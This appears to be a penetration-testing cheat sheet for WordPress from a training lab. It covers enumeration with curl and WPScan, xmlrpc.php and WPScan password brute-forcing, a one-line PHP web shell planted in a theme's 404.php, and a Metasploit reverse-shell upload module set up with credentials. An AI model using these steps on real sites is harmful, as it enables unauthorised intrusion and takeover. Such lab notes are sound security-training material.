# Wordpress FileStructure

```
$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

- **index.php** is the homepage of WordPress.

- **license.txt** contains useful information such as the version WordPress installed.

- **wp-activate.php** is used for the email activation process when setting up a new WordPress site.

- wp-admin folder contains the login page for administrator access, could be located at:
    - /wp-admin/login.php
    - /wp-admin/wp-login.php
    - /login.php
    - /wp-login.php


- wp-config.php file contains information required by WordPress to connect to the database

- wp-content is the main directory where plugins and themes are stored

- wp-content/uploads/ is usually where any files uploaded to the platform are stored






# Discovery/Footprinting


A quick way to identify a WordPress site is by browsing to the /robots.txt file. A typical robots.txt on a WordPress installation may look like:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```


WordPress stores its plugins in the wp-content/plugins directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the wp-content/themes directory. These files should be carefully enumerated as they may lead to RCE.

    
# Wordpress Default Users    
There are five types of users on a standard WordPress installation.

- Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
    
- Editor: An editor can publish and manage posts, including the posts of other users.
    
- Author: They can publish and manage their own posts.
    
- Contributor: These users can write and manage their own posts but cannot publish them.
    
- Subscriber: These are standard users who can browse posts and edit their profiles.



# Enumeration

```
$ curl -s http://blog.inlanefreight.local | grep WordPress

$ curl -s http://blog.inlanefreight.local/ | grep themes

$ curl -s http://blog.inlanefreight.local/ | grep plugins

```

### Version 

`$ curl -s http://wordpress.site | grep generator`

` $ curl -s http://wordpress.site | grep stylesheet`

` $ curl -s http://wordpress.site | grep text/javascript`


# Enumerating Plugins/Themes


`$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2`

`$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2`


# User Enum 

#### Using posts

- find a post and its author

- link could be somethin like `./author/name`

- You could associate the user with his id with something like `curl ./?author=1`

#### JSON endpoint 

`$ curl http://blog.com/wp-json/wp/v2/users | jq`


# Login brute force

###  xmlrpc.php page

- Ensure you have access to the xmlrpc.php file in `https://example.com/xmlrpc.php `

- Send the following

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

- Brute Forcre with  something like

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```

- Response status will be 200 even with wrong credentials



# WPScan

`$ sudo gem install wpscan`


We can obtain an API token from [WPVulnDB](https://wpscan.com/profile/)

### Enumeration

By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. 

- --enumerate ap to enum all plugins
- Use the -t flag to specify working thread (default = 5)

`$ sudo wpscan --url http://site.local --enumerate --api-token <SNIP>`






### Login Bruteforce


WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks:

- xmlrpc (WordPress API through /xmlrpc.php)
- wp-login (tandard WordPress login page)



`$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://site.local`


The --password-attack flag is used to supply the type of attack. The -U argument takes in a list of users or a file containing user names. This applies to the -P passwords option as well. The -t flag is the number of threads which we can adjust up or down depending. 



# Code Execution

        
With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress  Click on Appearance on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme.

Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.

`system($_GET[0]);`


We know that WordPress themes are located at /wp-content/themes/<theme name>. 

`$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`



### Metasploit use

The wp_admin_shell_upload module from Metasploit can be used to upload a shell and execute it automatically.

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local

```

